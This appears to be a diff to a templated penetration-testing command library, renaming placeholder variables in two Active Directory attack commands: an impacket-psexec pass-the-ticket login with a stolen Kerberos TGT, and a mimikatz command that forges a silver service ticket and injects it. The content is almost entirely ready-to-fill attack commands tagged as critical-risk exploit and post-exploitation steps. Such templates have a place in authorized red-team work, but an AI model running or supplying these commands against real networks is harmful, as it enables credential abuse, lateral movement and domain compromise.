@@ -109,7 +109,7 @@ impacket-getTGT {{DOMAIN:domain}}/{{USERNAME:str}} -hashes :{{NTHASH:str}} -dc-i
 Use a stolen TGT for authentication.
 
 ```bash
-KRB5CCNAME={{CCACHE:file:ticket.ccache}} impacket-psexec {{DOMAIN:domain}}/{{USERNAME:str}}@{{TARGET:str:host.corp.local}} -k -no-pass
+KRB5CCNAME={{CCACHE:file:ticket.ccache}} impacket-psexec {{DOMAIN:domain}}/{{USERNAME:str}}@{{RHOST_NAME:str}} -k -no-pass
 ```
 
 <!-- meta: risk=critical | phase=exploit | tags=ptt,ticket -->
@@ -131,7 +131,7 @@ mimikatz "kerberos::golden /domain:{{DOMAIN:domain}} /sid:{{DOMAIN_SID:str}} /kr
 Forge a TGS for a specific service account.
 
 ```bash
-mimikatz "kerberos::golden /domain:{{DOMAIN:domain}} /sid:{{DOMAIN_SID:str}} /target:{{TARGET_HOST:str}} /rc4:{{SVC_HASH:str}} /user:{{USERNAME:str}} /service:{{SERVICE:str:cifs}} /ptt" "exit"
+mimikatz "kerberos::golden /domain:{{DOMAIN:domain}} /sid:{{DOMAIN_SID:str}} /target:{{TARGET_HOST:str}} /rc4:{{SVC_HASH:str}} /user:{{TARGET_USER:str}} /service:{{SERVICE:str:cifs}} /ptt" "exit"
 ```
 
 <!-- meta: risk=critical | phase=post | tags=silver,mimikatz -->
